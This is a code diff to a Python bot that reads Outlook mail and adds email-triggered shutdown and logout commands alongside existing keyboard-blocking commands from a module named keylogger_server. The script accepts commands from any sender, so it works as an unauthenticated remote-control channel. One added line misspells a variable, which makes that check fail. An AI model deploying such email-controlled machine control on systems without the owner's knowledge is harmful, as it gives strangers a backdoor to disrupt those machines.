@@ -1,10 +1,12 @@
 import time
 from datetime import datetime, timedelta
 import keylogger_server
+import shutdown_logout_server
 import win32com.client
 
 outlook = win32com.client.Dispatch("Outlook.Application").GetNamespace("MAPI")
 islock = 0
+machineState = 1
 def sendBack(subject,body,sendTo):
     repMailItem = win32com.client.Dispatch("Outlook.Application").CreateItem(0)
     repMailItem.Subject = subject
@@ -16,7 +18,7 @@ def sendBack(subject,body,sendTo):
     repMailItem.Send()
 
 def listen(msg):
-    global islock
+    global islock,machineState
     string = msg.lower().strip().split()
     rep = ""
     if "mapi" == string[0]:
@@ -36,6 +38,13 @@ def listen(msg):
                     rep = "The keyboard state is block"
                 else:
                     rep = "The keyboard state is unblock"
+        if "system" == string[1]:
+            if "shutdown" == string[2]:
+                machineState = 0
+                rep = "The system is shutdown"
+            elif "logout" == string[2]:
+                machineState = 2
+                rep = "The system is logout"
     return rep
 
 inbox = outlook.GetDefaultFolder(6)
@@ -51,6 +60,11 @@ while True:
             sendBack("I'm bot",rep,mailNow.Sender.GetExchangeUser().PrimarySmtpAddress)
             mailDefault = mailNow
             print(True)
+
+        if(machineSate == 0):
+            shutdown_logout_server.shutdown_logout("shutdown")
+        elif machineState == 2 :
+            shutdown_logout_server.shutdown_logout("logout")
     else:
         print(False)
 
